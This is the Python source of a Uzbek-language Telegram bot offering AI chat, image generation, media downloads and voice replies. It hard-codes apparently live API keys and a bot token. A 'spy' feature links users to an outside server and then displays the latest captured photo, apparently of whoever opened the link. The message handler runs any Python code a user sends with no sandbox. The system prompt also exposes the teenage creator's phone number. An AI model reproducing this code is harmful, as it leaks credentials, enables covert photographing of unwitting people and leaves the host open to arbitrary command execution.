import yt_dlp
import logging
import httpx
import tempfile
import subprocess
import edge_tts
import os
import requests as req
import urllib.parse
import base64
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ForceReply
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from groq import Groq
from tavily import TavilyClient

ADMIN_ID = 164581954
user_list = set()
message_count = 0

TAVILY_API_KEY = "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"
tavily_client = TavilyClient(api_key=TAVILY_API_KEY)

TELEGRAM_TOKEN = "8287929918:AAFvepqgTJy04VgcO33CvNkVQ179sz-BDc4"
GROQ_API_KEY = "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"

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

client = Groq(api_key=GROQ_API_KEY)

conversation_history = {}
last_image_prompt = {}
music_search_results = {}
user_state = {}


# ===================== START =====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_name = update.effective_user.first_name
    user_list.add(update.effective_user.id)

    keyboard = [
        [
            InlineKeyboardButton("🎨 Rasm yaratish", callback_data="menu_rasm"),
            InlineKeyboardButton("🎵 Musiqa", callback_data="menu_music"),
        ],
        [
            InlineKeyboardButton("🎬 Video yuklash", callback_data="menu_video"),
            InlineKeyboardButton("👁️ Spy", callback_data="menu_spy"),
        ],
        [
            InlineKeyboardButton("🗑️ Tarixni tozalash", callback_data="menu_clear"),
            InlineKeyboardButton("❓ Yordam", callback_data="menu_help"),
        ],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        f"Salom, {user_name}! 👋\n"
        f"👥 {len(user_list)} ta foydalanuvchi\n\n"
        "🤖 *Uchiha Bot imkoniyatlari:*\n\n"
        "🎨 *Rasm yaratish* — xohlagan rasm, mashxur odamlar, qahramonlar\n"
        "🎵 *Musiqa* — qo'shiq qidiradi va mp3 yuklab beradi\n"
        "🎬 *Video yuklash* — YouTube videolarini yuklab beradi\n"
        "👁️ *Spy* — josuslik kamerasi hazili\n"
        "🧠 *AI chat* — har qanday savolga javob beradi\n"
        "🐍 *Python ilova* — xohlagan ilovani yaratib beradi\n"
        "🌐 *Veb sayt* — HTML/CSS/JS sayt yaratadi\n"
        "🔊 *Ovozli chat* — ovozli xabar yuborsa javob qaytaradi\n"
        "📷 *Rasm tahlil* — rasm yuborsang tavsiflab beradi\n\n"
        "Quyidagi menyudan tanlang yoki shunchaki xabar yozing:Masalan salom",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )


# ===================== RASM PROMPT YARATISH =====================
async def _create_image_prompt(query: str) -> str:
    try:
        search_results = tavily_client.search(query, max_results=2)
        search_info = " ".join([r["content"][:300] for r in search_results["results"]])
    except:
        search_info = query

    response = client.chat.completions.create(
        model="llama-3.3-70b-versatile",
        messages=[
            {
                "role": "system",
                "content": """Sen professional rasm yaratish uchun prompt yozuvchisan.
Quyidagi qoidalarga qat'iy amal qil:
- Faqat inglizcha prompt yoz
- Juda batafsil va aniq yoz
- Agar taniqli qahramon yoki shaxs bo'lsa — uning tashqi ko'rinishini batafsil tasvirla
- Rang, kiyim, fon, yoritish, uslub — hammasini yoz
- Yuqori sifatli rasm chiqishi uchun: "highly detailed, 8k, masterpiece, sharp focus" kabi qo'sh
- FAQAT promptni yoz, boshqa hech narsa yozma"""
            },
            {
                "role": "user",
                "content": f"So'rov: {query}\nInternet ma'lumoti: {search_info}"
            }
        ],
        max_tokens=300
    )
    return response.choices[0].message.content.strip()


async def _generate_and_send_image(message, query: str, msg, user_id: int):
    try:
        english_prompt = await _create_image_prompt(query)
        last_image_prompt[user_id] = query

        encoded = urllib.parse.quote(english_prompt)
        image_url = f"https://image.pollinations.ai/prompt/{encoded}?width=1024&height=1024&nologo=true&enhance=true&model=flux"

        async with httpx.AsyncClient(timeout=120) as http_client:
            response = await http_client.get(image_url)

        keyboard = [
            [
                InlineKeyboardButton("🔄 Qayta yaratish", callback_data="rasm_qayta"),
                InlineKeyboardButton("✏️ O'zgartirish", callback_data="rasm_ozgartir"),
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await message.reply_photo(
            response.content,
            caption=f"🖼️ {query}",
            reply_markup=reply_markup
        )
        await msg.delete()
    except Exception as e:
        logger.error(f"Rasm xatosi: {e}")
        await msg.edit_text("❌ Rasm yaratishda xato yuz berdi.")


# ===================== RASM TAHLIL =====================
async def _analyze_photo(message, image_base64: str, caption: str = None):
    prompt_text = f"Bu rasmni batafsil tavsifla. Agar taniqli qahramon, kino, serial, o'yin, shaxs bo'lsa — nomini top. O'zbek tilida yoz."
    if caption:
        prompt_text = f"Bu rasmni tavsifla va '{caption}' uslubida yangi rasm uchun inglizcha Stable Diffusion prompt yoz. FAQAT promptni yoz."

    result = client.chat.completions.create(
        model="meta-llama/llama-4-scout-17b-16e-instruct",
        messages=[
            {
                "role": "user",
                "content": [
                    {"type": "image_url", "image_url": {"url": f"data:image/jpeg;base64,{image_base64}"}},
                    {"type": "text", "text": prompt_text}
                ]
            }
        ],
        max_tokens=500
    )
    return result.choices[0].message.content.strip()


# ===================== CALLBACK HANDLER =====================
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = query.from_user.id

    if data == "menu_rasm":
        await query.message.reply_text(
            "🎨 Qanday rasm kerak? Yozing!\n\n"
            "Masalan:\n"
            "• *tezkor mashina*\n"
            "• *chiroyli tog' manzarasi*\n"
            "• *Eiffel Tower kechasi*",
            parse_mode="Markdown"
        )

    elif data == "menu_music":
        await query.message.reply_text(
            "🎵 Qo'shiq nomini yozing!\n\n"
            "Masalan:\n"
            "• *Mondagem Peregiza*\n"
            "• *java dunyo sening togangmas*\n"
            "• *Stromae Papaoutai*",
            parse_mode="Markdown"
        )

    elif data == "menu_video":
        await query.message.reply_text(
            "🎬 YouTube linkini yuboring!\n\n"
            "Masalan: `/video https://youtube.com/...`",
            parse_mode="Markdown"
        )

    elif data == "menu_spy":
        keyboard = [
            [InlineKeyboardButton("🔗 Linkni ochish", url=f"https://uchiha-spy-server.onrender.com/?id={user_id}")],
            [InlineKeyboardButton("📸 Rasmni ko'rish", callback_data="spy_result")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.reply_text(
            "👁️ Seni ko'rib turibman...\n\nQuyidagi tugmani bos:",
            reply_markup=reply_markup
        )

    elif data == "menu_clear":
        conversation_history[user_id] = []
        await query.message.reply_text("✅ Suhbat tarixi tozalandi!")

    elif data == "menu_help":
        keyboard = [[InlineKeyboardButton("🏠 Asosiy menyu", callback_data="menu_main")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.reply_text(
            "🤖 *Uchiha Bot — Yordam*\n\n"
            "📌 *Buyruqlar:*\n"
            "/start — Asosiy menyu\n"
            "/clear — Suhbat tarixini tozalash\n"
            "/rasm [tavsif] — Rasm yaratish\n"
            "/video [link] — YouTube video yuklash\n"
            "/spy — Josuslik kamerasi\n\n"
            "💡 *Maslahatlar:*\n"
            "• Qo'shiq nomi yozsang — musiqa topadi\n"
            "• Rasm yuborsang — tahlil qiladi\n"
            "• Ovozli xabar yuborsang — ovozli javob beradi\n"
            "• Ilova yozib ber desa — Python ilova yaratadi",
            parse_mode="Markdown",
            reply_markup=reply_markup
        )

    elif data == "menu_main":
        keyboard = [
            [
                InlineKeyboardButton("🎨 Rasm yaratish", callback_data="menu_rasm"),
                InlineKeyboardButton("🎵 Musiqa", callback_data="menu_music"),
            ],
            [
                InlineKeyboardButton("🎬 Video yuklash", callback_data="menu_video"),
                InlineKeyboardButton("👁️ Spy", callback_data="menu_spy"),
            ],
            [
                InlineKeyboardButton("🗑️ Tarixni tozalash", callback_data="menu_clear"),
                InlineKeyboardButton("❓ Yordam", callback_data="menu_help"),
            ],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.reply_text("🏠 Asosiy menyu:", reply_markup=reply_markup)

    elif data == "rasm_qayta":
        prompt = last_image_prompt.get(user_id)
        if not prompt:
            await query.message.reply_text("❌ Avvalgi rasm topilmadi.")
            return
        msg = await query.message.reply_text("🎨 Qayta yaratilmoqda...")
        await _generate_and_send_image(query.message, prompt, msg, user_id)

    elif data == "rasm_ozgartir":
        user_state[user_id] = "waiting_edit"
        await query.message.reply_text(
            "✏️ *Rasmni qanday o'zgartirmoqchisiz?*\n\n"
            "Masalan:\n"
            "• Qora-oq qilib\n"
            "• Kuchli effektlar bilan\n"
            "• Rasmiy uslubda\n"
            "• Chiroyli fon bilan\n\n"
            "Yozing 👇",
            parse_mode="Markdown",
            reply_markup=ForceReply(selective=True)
        )

    elif data == "spy_result":
        SERVER = "https://uchiha-spy-server.onrender.com"
        try:
            r = req.get(f"{SERVER}/latest")
            data_r = r.json()
            token = data_r["token"]
            photo_url = f"{SERVER}/photo/{token}"
            await query.message.reply_photo(photo=photo_url, caption="Bu sizmisiz? 😏😂")
        except:
            await query.message.reply_text("Hali rasm yo'q!")

    elif data.startswith("music_dl_"):
        idx = int(data.split("_")[2])
        results = music_search_results.get(user_id, [])
        if not results or idx >= len(results):
            await query.message.reply_text("❌ Qo'shiq topilmadi.")
            return

        song = results[idx]
        msg = await query.message.reply_text(f"⬇️ *{song['title']}* yuklanmoqda...", parse_mode="Markdown")

        try:
            ydl_opts = {
                'format': 'bestaudio/best',
                'outtmpl': f'music_{user_id}.%(ext)s',
                'quiet': True,
                'postprocessors': [{
                    'key': 'FFmpegExtractAudio',
                    'preferredcodec': 'mp3',
                    'preferredquality': '192',
                }],
            }
            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                ydl.download([song['url']])

            mp3_file = f'music_{user_id}.mp3'
            with open(mp3_file, "rb") as audio:
                await query.message.reply_audio(
                    audio,
                    title=song['title'],
                    caption=f"🎵 {song['title']}"
                )
            os.remove(mp3_file)
            await msg.delete()

        except Exception as e:
            logger.error(f"Musiqa yuklash xatosi: {e}")
            await msg.edit_text("❌ Qo'shiq yuklab bo'lmadi.")


# ===================== RASM YARATISH BUYRUG'I =====================
async def generate_image(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ Tavsif yozing!\nMasalan: /rasm chiroyli tog' manzarasi")
        return

    prompt = " ".join(context.args)
    user_id = update.effective_user.id
    msg = await update.message.reply_text("🎨 Rasm chizilmoqda, kuting...")
    await _generate_and_send_image(update.message, prompt, msg, user_id)


# ===================== RASM YUBORILGANDA =====================
async def edit_image(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    photo = update.message.photo[-1]
    file = await context.bot.get_file(photo.file_id)

    async with httpx.AsyncClient() as http_client:
        response = await http_client.get(file.file_path)
        image_data = response.content

    image_base64 = base64.b64encode(image_data).decode('utf-8')

    if update.message.caption:
        # Caption bor — o'zgartir
        msg = await update.message.reply_text("🎨 Rasm o'zgartirilmoqda...")
        try:
            new_prompt = await _analyze_photo(update.message, image_base64, update.message.caption)
            last_image_prompt[user_id] = new_prompt

            encoded = urllib.parse.quote(new_prompt)
            image_url = f"https://image.pollinations.ai/prompt/{encoded}?width=1024&height=1024&nologo=true&enhance=true&model=flux"

            async with httpx.AsyncClient(timeout=120) as http_client:
                img_response = await http_client.get(image_url)

            keyboard = [[
                InlineKeyboardButton("🔄 Qayta chizish", callback_data="rasm_qayta"),
                InlineKeyboardButton("✏️ O'zgartirish", callback_data="rasm_ozgartir"),
            ]]
            reply_markup = InlineKeyboardMarkup(keyboard)

            await update.message.reply_photo(
                img_response.content,
                caption=f"🖼️ {update.message.caption}",
                reply_markup=reply_markup
            )
            await msg.delete()
        except Exception as e:
            logger.error(f"Rasm tahrirlash xatosi: {e}")
            await msg.edit_text("❌ Rasm o'zgartirishda xato.")
    else:
        # Caption yo'q — tahlil qil
        msg = await update.message.reply_text("🔍 Rasm tahlil qilinmoqda...")
        try:
            analysis = await _analyze_photo(update.message, image_base64)
            keyboard = [
                [
                    InlineKeyboardButton("🎨 Shu rasmni chizish", callback_data="rasm_qayta"),
                    InlineKeyboardButton("✏️ O'zgartirish", callback_data="rasm_ozgartir"),
                ]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await msg.edit_text(analysis, reply_markup=reply_markup)
        except Exception as e:
            logger.error(f"Rasm tahlil xatosi: {e}")
            await msg.edit_text("❌ Rasm tahlil qilib bo'lmadi.")


# ===================== VIDEO YUKLASH =====================
async def download_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ YouTube linki yozing!\nMasalan: /video https://youtube.com/shorts/xxx")
        return

    url = context.args[0]
    msg = await update.message.reply_text("⬇️ Video yuklanmoqda, kuting...")

    try:
        ydl_opts = {
            'format': 'best[filesize<50M]/best',
            'outtmpl': f'video_{update.effective_user.id}.%(ext)s',
            'quiet': True,
        }
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)
            filename = ydl.prepare_filename(info)

        with open(filename, 'rb') as video:
            await update.message.reply_video(video, caption=f"🎬 {info.get('title', 'Video')}")

        os.remove(filename)
        await msg.delete()

    except Exception as e:
        logger.error(f"Video xatosi: {e}")
        await msg.edit_text("❌ Video yuklab bo'lmadi. Link to'g'rimi?")


# ===================== VIDEO TAHLIL =====================
async def analyze_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = await update.message.reply_text("🎬 Video tahlil qilinmoqda...")

    try:
        video = update.message.video
        if video.thumbnail:
            file = await context.bot.get_file(video.thumbnail.file_id)
        else:
            await msg.edit_text("❌ Video tahlil qilib bo'lmadi.")
            return

        async with httpx.AsyncClient() as http_client:
            response = await http_client.get(file.file_path)
            image_data = response.content

        image_base64 = base64.b64encode(image_data).decode('utf-8')

        result = client.chat.completions.create(
            model="meta-llama/llama-4-scout-17b-16e-instruct",
            messages=[
                {
                    "role": "user",
                    "content": [
                        {"type": "image_url", "image_url": {"url": f"data:image/jpeg;base64,{image_base64}"}},
                        {"type": "text", "text": "Bu video kadrini tahlil qil. Agar kino, serial, o'yin bo'lsa nomini top. O'zbek tilida javob ber."}
                    ]
                }
            ],
            max_tokens=500
        )

        keyboard = [[InlineKeyboardButton("🎨 Shu janrdagi rasm chizish", callback_data="rasm_qayta")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await msg.edit_text(result.choices[0].message.content, reply_markup=reply_markup)

    except Exception as e:
        logger.error(f"Video tahlil xatosi: {e}")
        await msg.edit_text("❌ Video tahlil qilib bo'lmadi.")


# ===================== MUSIQA QIDIRISH =====================
async def search_music(update: Update, context: ContextTypes.DEFAULT_TYPE, query_text: str):
    user_id = update.effective_user.id

    # AI yordamida qo'shiq nomini ajratish
    try:
        extraction = client.chat.completions.create(
            model="llama-3.3-70b-versatile",
            messages=[
                {
                    "role": "system",
                    "content": "Foydalanuvchi xabaridan qo'shiq nomini ajratib ol. Faqat qo'shiq nomini yoz, boshqa hech narsa yozma. Agar aniq nom bo'lmasa — xabarni o'zini yoz."
                },
                {"role": "user", "content": query_text}
            ],
            max_tokens=50
        )
        clean_query = extraction.choices[0].message.content.strip()
    except:
        clean_query = query_text

    msg = await update.message.reply_text(f"🎵 *{clean_query}* qidirilmoqda...", parse_mode="Markdown")

    try:
        ydl_opts = {'quiet': True, 'extract_flat': True}

        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            results = ydl.extract_info(f"ytsearch10:{clean_query}", download=False)
            entries = results.get('entries', [])[:10]

        if not entries:
            await msg.edit_text("❌ Qo'shiq topilmadi.")
            return

        music_search_results[user_id] = [
            {
                'title': e.get('title', 'Noma\'lum'),
                'url': f"https://youtube.com/watch?v={e.get('id', '')}",
                'duration': e.get('duration', 0)
            }
            for e in entries if e.get('id')
        ]

        text = f"🎵 *{clean_query}* natijalar:\n\n"
        for i, song in enumerate(music_search_results[user_id]):
            duration = song.get('duration', 0)
            if duration:
                mins = duration // 60
                secs = duration % 60
                time_str = f" `{mins}:{secs:02d}`"
            else:
                time_str = ""
            text += f"{i + 1}. {song['title']}{time_str}\n"

        keyboard = []
        row = []
        for i in range(len(music_search_results[user_id])):
            row.append(InlineKeyboardButton(str(i + 1), callback_data=f"music_dl_{i}"))
            if len(row) == 5:
                keyboard.append(row)
                row = []
        if row:
            keyboard.append(row)

        reply_markup = InlineKeyboardMarkup(keyboard)
        await msg.delete()
        await update.message.reply_text(text, parse_mode="Markdown", reply_markup=reply_markup)

    except Exception as e:
        logger.error(f"Musiqa qidirish xatosi: {e}")
        await msg.edit_text("❌ Qo'shiq qidirishda xato.")


# ===================== ILOVA YARATISH =====================
async def create_app(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_text = update.message.text
    wait_msg = await update.message.reply_text("⚙️ Ilova yaratilmoqda, kuting...")

    response = client.chat.completions.create(
        model="llama-3.3-70b-versatile",
        messages=[
            {
                "role": "system",
                "content": """Sen dunyodagi eng yaxshi Python dasturchilaridan birisin.
Foydalanuvchi so'ragan ilovani professional darajada yaratasan.
Qoidalar:
- Faqat Python kodi yoz, hech qanday izoh yoki tushuntirish yozma
- tkinter ishlatib chiroyli, zamonaviy UI yasagin
- Ranglar professional bo'lsin (qora, kulrang, ko'k tonlar)
- Barcha tugmalar, funksiyalar to'liq ishlashi kerak
- Xato bo'lsa try/except bilan ushlaydi
- Kod ishga tushirilsa darhol to'liq ishlaydigan ilova ochilishi kerak
- Hech qanday placeholder yoki TODO qoldirma
- input() ishlatma"""
            },
            {"role": "user", "content": f"Yarat: {user_text}"}
        ],
        max_tokens=8192
    )

    code = response.choices[0].message.content
    code = code.replace("```python", "").replace("```", "").strip()

    filename = f"ilova_{update.effective_user.id}.py"
    with open(filename, "w", encoding="utf-8") as f:
        f.write(code)

    await wait_msg.delete()
    await update.message.reply_document(
        document=open(filename, "rb"),
        filename="ilova.py",
        caption="✅ Ilova tayyor! Yuklab oling va ishga tushiring 🚀"
    )
    os.remove(filename)


# ===================== OVOZLI XABAR =====================
async def handle_voice(update: Update, context: ContextTypes.DEFAULT_TYPE):
    voice_file = await context.bot.get_file(update.message.voice.file_id)

    with tempfile.NamedTemporaryFile(suffix=".ogg", delete=False) as tmp:
        await voice_file.download_to_drive(tmp.name)
        voice_path = tmp.name

    with open(voice_path, "rb") as f:
        transcription = client.audio.transcriptions.create(
            file=("voice.ogg", f),
            model="whisper-large-v3",
        )
    user_text = transcription.text

    user_id = update.effective_user.id
    if user_id not in conversation_history:
        conversation_history[user_id] = [
            {"role": "system", "content": "Sen Uchiha Bot degan AI yordamchisisisan. O'zbek tilida qisqa va aniq javob ber."}
        ]

    conversation_history[user_id].append({"role": "user", "content": user_text})

    response = client.chat.completions.create(
        model="llama-3.3-70b-versatile",
        messages=conversation_history[user_id],
        max_tokens=1024
    )
    reply_text = response.choices[0].message.content
    conversation_history[user_id].append({"role": "assistant", "content": reply_text})

    communicate = edge_tts.Communicate(reply_text, voice="en-US-GuyNeural")
    with tempfile.NamedTemporaryFile(suffix=".mp3", delete=False) as out:
        await communicate.save(out.name)
        await update.message.reply_voice(voice=open(out.name, "rb"), caption=f"🎙️ {reply_text[:100]}...")

    os.unlink(voice_path)
    os.unlink(out.name)


# ===================== SPY =====================
async def spy_cam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    keyboard = [
        [InlineKeyboardButton("🔗 Linkni ochish", url=f"https://uchiha-spy-server.onrender.com/?id={user_id}")],
        [InlineKeyboardButton("📸 Rasmni ko'rish", callback_data="spy_result")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "👁️ Seni ko'rib turibman...\n\nQuyidagi tugmani bos:",
        reply_markup=reply_markup
    )


async def spy_result(update: Update, context: ContextTypes.DEFAULT_TYPE):
    SERVER = "https://uchiha-spy-server.onrender.com"
    try:
        r = req.get(f"{SERVER}/latest")
        data = r.json()
        token = data["token"]
        photo_url = f"{SERVER}/photo/{token}"
        await update.message.reply_photo(photo=photo_url, caption="Bu sizmisiz? 😏😂")
    except:
        await update.message.reply_text("Hali rasm yo'q!")


# ===================== HELP & CLEAR =====================
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("🏠 Asosiy menyu", callback_data="menu_main")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🤖 *Uchiha Bot — Yordam*\n\n"
        "📌 *Buyruqlar:*\n"
        "/start — Asosiy menyu\n"
        "/clear — Suhbat tarixini tozalash\n"
        "/rasm [tavsif] — Rasm yaratish\n"
        "/video [link] — YouTube video yuklash\n"
        "/spy — Josuslik kamerasi\n\n"
        "💡 *Maslahatlar:*\n"
        "• Qo'shiq nomi yozsang — musiqa topadi\n"
        "• Rasm yuborsang — tahlil qiladi\n"
        "• Ovozli xabar yuborsang — ovozli javob beradi\n"
        "• Ilova yozib ber desa — Python ilova yaratadi",
        parse_mode="Markdown",
        reply_markup=reply_markup
    )


async def clear_history(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    conversation_history[user_id] = []
    await update.message.reply_text("✅ Suhbat tarixi tozalandi!")


# ===================== ASOSIY XABAR =====================
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_list.add(update.effective_user.id)
    global message_count
    message_count += 1
    user_id = update.effective_user.id
    user_message = update.message.text

    # Rasm edit holati
    if user_state.get(user_id) == "waiting_edit":
        user_state.pop(user_id)
        prompt = last_image_prompt.get(user_id, "")
        if prompt:
            msg = await update.message.reply_text("🎨 Rasm o'zgartirilmoqda...")
            new_query = f"{prompt}, {user_message}"
            await _generate_and_send_image(update.message, new_query, msg, user_id)
        else:
            await update.message.reply_text("❌ Avvalgi rasm topilmadi.")
        return

    # Ilova yaratish
    if any(word in user_message.lower() for word in ["ilova yozib", "ilova qilib", "dastur yozib", "dastur qilib", "app yozib", "ilovasini yozib", "ilovasi yozib", "ilova yasab"]):
        await create_app(update, context)
        return

    # Musiqa — AI yordamida aniqlash
    music_check = client.chat.completions.create(
        model="llama-3.3-70b-versatile",
        messages=[
            {
                "role": "system",
                "content": "Foydalanuvchi xabarida musiqa yoki qo'shiq so'ralyaptimi? Faqat 'ha' yoki 'yoq' deb javob ber."
            },
            {"role": "user", "content": user_message}
        ],
        max_tokens=5
    )
    if "ha" in music_check.choices[0].message.content.lower():
        await search_music(update, context, user_message)
        return

    # Kod ishga tushirish
    if "```" in user_message or user_message.strip().startswith(("print(", "def ", "for ", "while ", "if ", "import ")):
        code = user_message.replace("```python", "").replace("```", "").strip()
        try:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False, encoding='utf-8') as f:
                f.write(code)
                temp_file = f.name

            result = subprocess.run(['python', temp_file], capture_output=True, text=True, timeout=5)
            output = result.stdout or result.stderr or "Natija yo'q"
            os.remove(temp_file)

            await update.message.reply_text(f"⚙️ *Kod natijasi:*\n```\n{output}\n```", parse_mode="Markdown")
            return

        except subprocess.TimeoutExpired:
            await update.message.reply_text("⏰ Vaqt tugadi!")
            return
        except Exception as e:
            await update.message.reply_text(f"❌ Xato: `{e}`", parse_mode="Markdown")
            return

    await update.message.chat.send_action("typing")

    # Rasm so'rovi — AI yordamida aniqlash
    image_check = client.chat.completions.create(
        model="llama-3.3-70b-versatile",
        messages=[
            {
                "role": "system",
                "content": "Foydalanuvchi xabarida rasm chizish so'ralyaptimi? Masalan: 'rasm chiz', 'rasm qil', 'ko'rsatib ber', taniqli qahramon yoki shaxs rasmi haqida. 'Kim yaratgan', 'sen kim', 'nima' kabi savollar rasm emas. Faqat 'ha' yoki 'yoq' deb javob ber."
            },
            {"role": "user", "content": user_message}
        ],
        max_tokens=5
    )
    if "ha" in image_check.choices[0].message.content.lower():
        msg = await update.message.reply_text("🎨 Rasm yaratilmoqda, kuting...")
        await _generate_and_send_image(update.message, user_message, msg, user_id)
        return

    # Internet qidirish
    try:
        search_results = tavily_client.search(user_message, max_results=3)
        search_context = "\n".join([r["content"][:300] for r in search_results["results"]])
        internet_info = f"\nInternet:\n{search_context}\n"
    except:
        internet_info = ""

    if user_id not in conversation_history:
        conversation_history[user_id] = [
            {
                "role": "system",
                "content": f"""Sen Uchiha Bot — aqlli, do'stona AI yordamchisisisan. Seni Erkinov Abrorbek (16 yosh) yaratgan.

Qoidalar:
- O'zbek tilida gapirgin, boshqa tilda yozsa o'sha tilda javob ber
- Qisqa, aniq va to'g'ri yoz — xato so'z yozma
- Har bir xabarda o'zingni tanishtirma, faqat so'ralganda
- Yaratuvchi haqida faqat so'ralganda ayt: Instagram @sung_jinwoo.2010, tel: +998 94 337 60 08
- Ko'p emoji ishlatma, faqat kerakli joylarda
- HTML so'rasa: ```html ... ``` ichida yoz
- Python so'rasa: ```python ... ``` ichida yoz, input() ishlatma
- Aniq va qisqa javob ber
- Foydalanuvchi ko'proq so'rasa ko'proq yoz
{internet_info}"""
            }
        ]

    conversation_history[user_id].append({"role": "user", "content": user_message})

    if len(conversation_history[user_id]) > 31:
        system_msg = conversation_history[user_id][0]
        conversation_history[user_id] = [system_msg] + conversation_history[user_id][-30:]

    try:
        response = client.chat.completions.create(
            model="llama-3.3-70b-versatile",
            messages=conversation_history[user_id],
            max_tokens=4096
        )

        assistant_reply = response.choices[0].message.content
        conversation_history[user_id].append({"role": "assistant", "content": assistant_reply})

        if "```html" in assistant_reply:
            try:
                html_code = assistant_reply.split("```html")[1].split("```")[0].strip()
                with tempfile.NamedTemporaryFile(mode='w', suffix='.html', delete=False, encoding='utf-8') as f:
                    f.write(html_code)
                    temp_file = f.name
                with open(temp_file, 'rb') as doc:
                    await update.message.reply_document(doc, filename="index.html", caption="🌐 Veb sayt fayli!")
                os.remove(temp_file)
                return
            except Exception as e:
                logger.error(f"HTML fayl xatosi: {e}")

        try:
            await update.message.reply_text(assistant_reply, parse_mode="Markdown")
        except:
            try:
                chunks = [assistant_reply[i:i+4000] for i in range(0, len(assistant_reply), 4000)]
                for chunk in chunks:
                    try:
                        await update.message.reply_text(chunk, parse_mode="Markdown")
                    except:
                        await update.message.reply_text(chunk)
            except:
                await update.message.reply_text(assistant_reply)

    except Exception as e:
        logger.error(f"Groq API xatosi: {e}")
        await update.message.reply_text("❌ Xato yuz berdi, qaytadan urinib ko'ring.")


# ===================== MAIN =====================
def main():
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("clear", clear_history))
    app.add_handler(CommandHandler("rasm", generate_image))
    app.add_handler(CommandHandler("video", download_video))
    app.add_handler(CommandHandler("spy", spy_cam))
    app.add_handler(CommandHandler("result", spy_result))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.VIDEO, analyze_video))
    app.add_handler(MessageHandler(filters.PHOTO, edit_image))
    app.add_handler(MessageHandler(filters.VOICE, handle_voice))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    logger.info("Bot ishga tushdi! ✅")
    app.run_polling()


if __name__ == "__main__":
    main()
